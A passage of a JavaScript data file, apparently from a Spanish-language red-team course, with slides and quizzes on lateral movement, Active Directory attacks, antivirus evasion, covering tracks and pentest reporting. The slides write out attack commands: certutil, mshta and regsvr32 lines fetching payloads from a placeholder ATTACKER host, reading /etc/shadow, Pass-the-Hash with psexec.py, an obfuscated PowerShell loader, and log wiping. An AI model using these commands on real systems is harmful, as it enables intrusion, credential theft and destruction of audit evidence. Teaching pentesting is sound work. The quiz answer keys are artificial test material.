            q: "¿Para qué se usa msfvenom?",
            opts: [
              "Para escanear redes en busca de hosts",
              "Para generar payloads/ejecutables maliciosos",
              "Para analizar tráfico de red",
              "Para hacer ataques de diccionario"
            ],
            c: 1,
            e: "msfvenom combina msfpayload y msfencode en una sola herramienta para generar payloads en múltiples formatos: exe, elf, php, py, powershell, etc."
          },
          {
            q: "¿Qué ventaja principal tiene Meterpreter sobre una shell normal?",
            opts: [
              "Es más rápido en velocidad de ejecución",
              "Corre en memoria y es más difícil de detectar por antivirus",
              "Tiene interfaz gráfica integrada",
              "Funciona sin conexión a internet"
            ],
            c: 1,
            e: "Meterpreter vive en memoria RAM, no escribe archivos en disco, cifra las comunicaciones y puede migrar entre procesos, lo que lo hace difícil de detectar con antivirus tradicionales."
          }
        ]
      }
    ]
  },
  {
    id: 6,
    nombre: "Movimiento Lateral",
    icon: "↔️",
    color: "#8b5cf6",
    tag: "LATERAL",
    descripcion: "Muévete por la red interna, compromete otros sistemas y entiende Active Directory y Pass-the-Hash.",
    lecciones: [
      {
        id: "rt6-l1",
        titulo: "Pivoting y Tunneling",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "Movimiento Lateral",
            contenido: "Una vez dentro, nos movemos a otros sistemas para ampliar el acceso.\n\nEscenario típico:\n→ Comprometemos un servidor web expuesto en internet\n→ Ese servidor tiene acceso a la red interna\n→ Desde ahí pivotamos a servidores internos no accesibles desde internet\n→ Buscamos el Domain Controller o bases de datos críticas"
          },
          {
            tag: "TÉCNICA",
            titulo: "Port Forwarding con SSH",
            contenido: "LOCAL PORT FORWARDING:\nssh -L 8080:TARGET_INTERNO:80 user@PIVOT_HOST\n# localhost:8080 → TARGET_INTERNO:80\n\nDYNAMIC SOCKS PROXY:\nssh -D 9050 user@PIVOT_HOST\n# Configura proxychains para usar el proxy\nproxychains nmap -sT 10.10.10.0/24\nproxychains firefox → navega por la red interna"
          },
          {
            tag: "TÉCNICA",
            titulo: "Pass-the-Hash",
            contenido: "En Windows puedes autenticarte con el hash NTLM SIN saber la contraseña.\n\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H 'HASH_NTLM'\n\nImpacket:\npsexec.py -hashes ':HASH_NTLM' Administrator@192.168.1.100\nwmiexec.py -hashes ':HASH_NTLM' Administrator@192.168.1.100\nsmbexec.py -hashes ':HASH_NTLM' Administrator@192.168.1.100\n\n→ El hash se obtiene con hashdump en Meterpreter o Mimikatz"
          }
        ],
        quiz: [
          {
            q: "¿Qué es el pivoting en un pentest?",
            opts: [
              "Escalar privilegios en el sistema comprometido",
              "Usar un host comprometido para acceder a sistemas de la red interna",
              "Cambiar de usuario en el mismo sistema",
              "Hacer un escaneo de puertos desde el atacante"
            ],
            c: 1,
            e: "El pivoting usa el host comprometido como intermediario (pivot) para alcanzar sistemas que no son accesibles directamente desde internet — como servidores de bases de datos, DCs, etc."
          },
          {
            q: "¿Qué es un ataque Pass-the-Hash?",
            opts: [
              "Crackear un hash NTLM offline con hashcat",
              "Usar el hash NTLM directamente para autenticarse sin saber la contraseña",
              "Interceptar el hash durante la autenticación en tránsito",
              "Crear un hash falso para engañar al servidor"
            ],
            c: 1,
            e: "Windows acepta hashes NTLM directamente en la autenticación. No es necesario crackearlos — puedes usarlos tal cual con herramientas como psexec.py o CrackMapExec."
          },
          {
            q: "¿Qué herramienta de Impacket ejecuta comandos remotos con Pass-the-Hash?",
            opts: ["hashcat", "mimikatz", "psexec.py", "bloodhound-python"],
            c: 2,
            e: "psexec.py de Impacket acepta hashes NTLM con el parámetro -hashes y te da una shell remota en el target, similar a PsExec de Sysinternals pero sin necesitar contraseña."
          }
        ]
      },
      {
        id: "rt6-l2",
        titulo: "Active Directory Attacks",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "Active Directory",
            contenido: "Active Directory gestiona usuarios, equipos y políticas en redes Windows corporativas.\n\nComprometer el Domain Controller = comprometer toda la organización.\n\nOBJETIVO FINAL: Domain Admin\n\nCONCEPTOS CLAVE:\n— DC: Domain Controller (el servidor de AD)\n— Domain Admin: cuenta con control total\n— GPO: políticas de grupo aplicadas a equipos\n— SPN: Service Principal Name (para Kerberoasting)"
          },
          {
            tag: "HERRAMIENTA",
            titulo: "BloodHound",
            contenido: "BloodHound visualiza las relaciones en AD para encontrar el camino más corto hacia Domain Admin.\n\nRECOLECTAR DATOS:\n.\\SharpHound.exe -c All\nbloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All\n\n→ Importar el ZIP en BloodHound\n→ Buscar: 'Shortest Path to Domain Admins'\n→ Ver qué usuarios o grupos tienen privilegios innecesarios"
          },
          {
            tag: "TÉCNICA",
            titulo: "Kerberoasting",
            contenido: "Solicitar tickets TGS para cuentas de servicio y crackearlos offline.\n\nGetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request\n\nRubeus:\n.\\Rubeus.exe kerberoast\n\nCRACKEAR:\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\n\n→ Si la cuenta de servicio tiene contraseña débil → comprometida\n→ Las cuentas de servicio a veces tienen privilegios elevados"
          }
        ],
        quiz: [
          {
            q: "¿Qué significa comprometer el Domain Controller?",
            opts: [
              "Tener acceso al servidor web principal",
              "Tener control total sobre toda la red Windows de la organización",
              "Haber obtenido acceso a un solo equipo del dominio",
              "Haber comprometido el firewall perimetral"
            ],
            c: 1,
            e: "El Domain Controller gestiona la autenticación de toda la red Windows. Comprometer el DC como Domain Admin permite controlar cada equipo, cuenta y servicio del dominio."
          },
          {
            q: "¿Para qué se usa BloodHound en ataques a Active Directory?",
            opts: [
              "Escanear vulnerabilidades web del DC",
              "Visualizar relaciones en AD para encontrar el camino hacia Domain Admin",
              "Hacer fuerza bruta de contraseñas de dominio",
              "Capturar tráfico Kerberos en la red"
            ],
            c: 1,
            e: "BloodHound mapea las relaciones (pertenencia a grupos, permisos delegados, ACLs) y encuentra rutas de escalada que serían imposibles de identificar manualmente."
          },
          {
            q: "¿Qué es Kerberoasting?",
            opts: [
              "Un exploit del protocolo Kerberos ejecutado en memoria",
              "Solicitar y crackear offline tickets TGS de cuentas de servicio",
              "Un ataque de denegación de servicio a Kerberos",
              "Interceptar tickets Kerberos en tránsito"
            ],
            c: 1,
            e: "Kerberoasting solicita tickets TGS cifrados con el hash de la cuenta de servicio. Esos tickets se pueden crackear offline con hashcat sin generar alertas en el DC."
          }
        ]
      }
    ]
  },
  {
    id: 7,
    nombre: "Evasión de Defensas",
    icon: "🕵️",
    color: "#06b6d4",
    tag: "EVASION",
    descripcion: "Bypass de antivirus, EDR, firewalls. Técnicas de ofuscación y living-off-the-land.",
    lecciones: [
      {
        id: "rt7-l1",
        titulo: "Bypass de Antivirus",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "Evasión de Defensas",
            contenido: "Los AV y EDR modernos detectan payloads conocidos por firma o comportamiento.\n\nTÉCNICAS DE EVASIÓN:\n— Ofuscación: cambiar el aspecto del código\n— Encoding/Encryption del payload\n— Process Injection: inyectar en procesos legítimos\n— Living-off-the-land: usar herramientas del SO\n— Firmless malware: basado en comportamiento\n— Fileless attacks: solo en memoria, sin tocar disco"
          },
          {
            tag: "TÉCNICA",
            titulo: "Living Off The Land (LOTL)",
            contenido: "Usar herramientas legítimas del SO para ejecutar código malicioso. El AV no las bloquea porque son herramientas del sistema.\n\nWINDOWS — LOLBAS (lolbas-project.github.io):\ncertutil -urlcache -split -f http://ATTACKER/payload.exe p.exe\nmshta http://ATTACKER/malicious.hta\nregsvr32 /s /u /i:http://ATTACKER/file.sct scrobj.dll\n\nLINUX — GTFOBins:\npython3 -c \"print(open('/etc/shadow').read())\""
          },
          {
            tag: "TÉCNICA",
            titulo: "Ofuscación básica",
            contenido: "POWERSHELL OFUSCADO:\n$c = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgA...'))\nIEX $c\n\nCOMPRESIÓN + CODIFICACIÓN:\npayload_bytes = gzip(payload)\npayload_b64 = base64(payload_bytes)\n\n→ Herramientas: AMSI Bypass, Invoke-Obfuscation\n→ Verificar evasión en: antiscan.me (no VirusTotal)\n→ Cada AV tiene distintas firmas → probar en varios"
          }
        ],
        quiz: [
          {
            q: "¿Qué significa 'Living Off The Land'?",
            opts: [
              "Vivir en el servidor comprometido sin ser detectado por semanas",
              "Usar herramientas legítimas del SO para ejecutar acciones maliciosas",
              "Usar solo exploits de día cero (0-days)",
              "Atacar desde infraestructura en la nube"
            ],
            c: 1,
            e: "LOTL usa binarios ya presentes en el sistema (certutil, mshta, regsvr32) para descargar y ejecutar payloads. Los AV los permiten porque son herramientas legítimas de Windows."
          },
          {
            q: "¿Cuál es el recurso que lista binarios de Windows usables para LOTL?",
            opts: ["gtfobins.github.io", "lolbas-project.github.io", "exploit-db.com", "cvedetails.com"],
            c: 1,
            e: "LOLBAS (Living Off the Land Binaries and Scripts) lista binarios, librerías y scripts nativos de Windows que pueden usarse para descargar, ejecutar o pivotar."
          },
          {
            q: "¿Qué es la ofuscación de código en contexto de evasión?",
            opts: [
              "Eliminar el código malicioso para evitar detección",
              "Modificar el aspecto del código sin cambiar su función para evitar detección por firma",
              "Cifrar toda la comunicación de red",
              "Comprimir el ejecutable para que sea más pequeño"
            ],
            c: 1,
            e: "La ofuscación cambia nombres de variables, codifica strings, reordena instrucciones — el código hace lo mismo pero parece diferente al antivirus que busca patrones conocidos."
          }
        ]
      },
      {
        id: "rt7-l2",
        titulo: "Cubriendo Huellas",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "Covering Tracks",
            contenido: "En un ataque real se borran evidencias. En un pentest se documenta todo pero se reporta qué huellas se dejaron.\n\nHUELLAS QUE SE DEJAN:\n— Logs de autenticación (/var/log/auth.log)\n— Logs del servidor web (access.log)\n— Historial de comandos (~/.bash_history)\n— Timestamps modificados en archivos\n— Conexiones en logs de firewall\n— Eventos en Windows Event Viewer"
          },
          {
            tag: "TÉCNICA",
            titulo: "Limpiar logs en Linux",
            contenido: "HISTORIAL:\nhistory -c\nunset HISTFILE\nexport HISTSIZE=0\n\nLOGS DEL SISTEMA:\n> /var/log/auth.log\n> /var/log/syslog\n> /var/log/apache2/access.log\n\nÚLTIMOS LOGINS:\n> /var/log/wtmp\n> /var/log/lastlog\n\n⚠️ Borrar todos los logs también es sospechoso para un SOC"
          },
          {
            tag: "TÉCNICA",
            titulo: "Timestamps y metadatos",
            contenido: "Los archivos tienen tres timestamps: atime (acceso), mtime (modificación), ctime (cambio de metadatos).\n\nVER TIMESTAMPS:\nstat archivo.txt\n\nMODIFICAR TIMESTAMP:\ntouch -t 202301010000 archivo_malicioso.sh\n\nCOPIAR TIMESTAMPS DE OTRO ARCHIVO:\ntouch -r /etc/passwd archivo_malicioso.sh\n\n→ Hace parecer que el archivo existía antes del pentest"
          }
        ],
        quiz: [
          {
            q: "¿Por qué borrar TODOS los logs puede ser contraproducente?",
            opts: [
              "Porque los logs se regeneran automáticamente solos",
              "Porque la ausencia total de logs también es una alerta para un equipo SOC",
              "Porque requiere demasiado tiempo y es muy lento",
              "Porque solo root puede borrar logs"
            ],
            c: 1,
            e: "Un equipo SOC experimentado nota cuando los logs están completamente vacíos o faltan horas de registros. Es más efectivo modificar selectivamente que borrar todo."
          },
          {
            q: "¿Qué hace 'history -c' en Linux?",
            opts: [
              "Muestra el historial completo con timestamps",
              "Borra el historial de comandos de la sesión actual en memoria",
              "Guarda el historial en un archivo cifrado",
              "Comprime el archivo de historial"
            ],
            c: 1,
            e: "history -c limpia el historial en memoria de la sesión actual. Para que no se guarde al cerrar sesión también se debe hacer unset HISTFILE o export HISTSIZE=0."
          },
          {
            q: "¿Para qué se usa 'touch -r /etc/passwd archivo.sh'?",
            opts: [
              "Para cambiar los permisos del archivo",
              "Para copiar los timestamps de /etc/passwd al archivo",
              "Para verificar la integridad del archivo",
              "Para crear un enlace simbólico entre archivos"
            ],
            c: 1,
            e: "touch -r copia los timestamps (atime, mtime) del archivo de referencia al archivo objetivo. Así el archivo malicioso parece tener la misma fecha que /etc/passwd."
          }
        ]
      }
    ]
  },
  {
    id: 8,
    nombre: "Reporte y Documentación",
    icon: "📋",
    color: "#64748b",
    tag: "REPORT",
    descripcion: "Cómo documentar un pentest profesionalmente. Estructura del informe, CVSS scoring y entregables.",
    lecciones: [
      {
        id: "rt8-l1",
        titulo: "El Informe de Pentest",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "¿Por qué documentar?",
            contenido: "El informe es el PRODUCTO FINAL del pentest. Sin él, el trabajo técnico no sirve de nada.\n\nES LO QUE EL CLIENTE:\n— Paga y recibe\n— Usa para remediar vulnerabilidades\n— Presenta a su directorio\n— Guarda como evidencia de auditoría\n\nUN BUEN PENTEST CON UN MAL INFORME = TRABAJO PERDIDO"
          },
          {
            tag: "ESTRUCTURA",
            titulo: "Estructura del informe",
            contenido: "1. RESUMEN EJECUTIVO\n→ Para la dirección, sin tecnicismos\n→ Impacto en el negocio\n→ Riesgos más críticos\n\n2. ALCANCE Y METODOLOGÍA\n→ Qué se probó, qué quedó fuera\n→ Herramientas y técnicas usadas\n\n3. HALLAZGOS (por criticidad)\n→ Descripción, evidencia, impacto, remediación\n\n4. CONCLUSIONES Y RECOMENDACIONES\n\n5. APÉNDICES TÉCNICOS"
          },
          {
            tag: "ESTÁNDAR",
            titulo: "CVSS - Scoring de vulnerabilidades",
            contenido: "CVSS (Common Vulnerability Scoring System) califica vulnerabilidades del 0 al 10.\n\nCRÍTICO:  9.0 - 10.0\nALTO:     7.0 - 8.9\nMEDIO:    4.0 - 6.9\nBAJO:     0.1 - 3.9\nINFO:     0.0\n\nFACTORES: vector de ataque, complejidad, privilegios requeridos, interacción del usuario, impacto en confidencialidad/integridad/disponibilidad."
          }
        ],
        quiz: [
          {
            q: "¿Cuál es el producto final más importante de un pentest?",
            opts: [
              "Los exploits y herramientas usadas durante el trabajo",
              "El informe con hallazgos, evidencias y recomendaciones de remediación",
              "Los logs del sistema durante el ataque",
              "Las capturas de pantalla de acceso"
            ],
            c: 1,
            e: "El informe es lo que el cliente compra. Sin un buen informe que explique qué se encontró, cómo explotarlo y cómo remediarlo, el trabajo técnico no tiene valor para el negocio."
          },
          {
            q: "¿A quién va dirigido el Resumen Ejecutivo?",
            opts: [
              "Al equipo técnico de IT para que solucione los problemas",
              "A la dirección y gerencia, sin tecnicismos, enfocado en impacto de negocio",
              "Al equipo de desarrollo para que parchee el código",
              "Al equipo de seguridad para que implemente controles"
            ],
            c: 1,
            e: "El Resumen Ejecutivo es para tomadores de decisiones que no necesitan detalles técnicos. Debe comunicar el riesgo en términos de negocio: impacto financiero, reputacional, regulatorio."
          },
          {
            q: "Según CVSS, ¿qué puntuación indica una vulnerabilidad CRÍTICA?",
            opts: ["7.0 - 8.9", "5.0 - 6.9", "9.0 - 10.0", "4.0 - 4.9"],
            c: 2,
            e: "CVSS 9.0-10.0 es CRÍTICO. Estas vulnerabilidades generalmente son explotables remotamente, sin autenticación, con impacto total en confidencialidad, integridad y disponibilidad."
          }
        ]
      },
      {
        id: "rt8-l2",
        titulo: "Herramientas de Documentación",
        slides: [
          {
            tag: "HERRAMIENTAS",
            titulo: "Tomar notas durante el pentest",
            contenido: "Documentar EN TIEMPO REAL es fundamental. Un hallazgo sin evidencia no existe.\n\n— CherryTree → notas jerárquicas, muy popular en pentesting\n— Obsidian → markdown, links entre notas, grafos\n— Notion → colaborativo, buen para equipos\n— KeepNote → clásico y ligero\n\nPRO TIP: Usa una estructura por IP/host y documenta cada comando ejecutado con su output."
          },
          {
            tag: "EVIDENCIA",
            titulo: "Screenshots y evidencia",
            contenido: "PARA CADA HALLAZGO NECESITAS:\n— Screenshot del exploit funcionando\n— Output exacto de la herramienta (copiar/pegar)\n— Request/Response HTTP si aplica (Burp Suite)\n— Fecha y hora del hallazgo\n— Nombre del tester que lo encontró\n\nHERRAMIENTAS:\n— Flameshot (Linux) → capturas anotadas\n— Greenshot (Windows)\n— Burp Suite → requests web"
          },
          {
            tag: "ESTÁNDARES",
            titulo: "Metodologías estándar",
            contenido: "— OWASP Testing Guide → para web apps\n— PTES (Penetration Testing Execution Standard)\n— NIST SP 800-115 → guía de pentesting\n— OSSTMM → seguridad operacional\n— MITRE ATT&CK → mapear técnicas usadas\n\nSIEMPRE:\n→ Asigna CVE IDs cuando sea posible\n→ Referencia OWASP Top 10 en vulnerabilidades web\n→ Indica el CVSS de cada hallazgo\n→ Prioriza por riesgo real, no por severidad técnica"
          }
        ],
        quiz: [
          {
            q: "¿Qué es CherryTree en pentesting?",
            opts: [
              "Un framework de explotación tipo Metasploit",
              "Una herramienta para tomar notas jerárquicas durante el pentest",
              "Un escáner de vulnerabilidades web",
              "Un analizador de tráfico de red"
            ],
            c: 1,
            e: "CherryTree es un editor de notas con estructura de árbol jerárquico, muy popular entre pentesters para organizar hallazgos por IP, servicio o módulo de ataque."
          },
          {
            q: "¿Qué framework del MITRE se usa para mapear técnicas de ataque?",
            opts: ["OWASP Top 10", "PTES", "MITRE ATT&CK", "NIST 800-115"],
            c: 2,
            e: "MITRE ATT&CK es una base de datos de tácticas, técnicas y procedimientos (TTPs) usados por atacantes reales. Mapear el pentest a ATT&CK muestra cobertura y brinda contexto de amenaza real."
          },
          {
            q: "¿Qué debe incluir como mínimo la evidencia de un hallazgo en el informe?",
            opts: [
              "Solo el nombre de la vulnerabilidad y su CVE",
              "Screenshot del exploit, output exacto, fecha y contexto del hallazgo",
              "El código fuente completo del exploit usado",
              "Solo la puntuación CVSS sin más explicación"
            ],
            c: 1,
            e: "La evidencia debe ser reproducible y verificable. Un screenshot, el output exacto del comando y la fecha/hora permiten al cliente y a su equipo técnico verificar y remediar el hallazgo."
          }
        ]
      }
    ]
  }
];

export default REDTEAM_MODULOS;
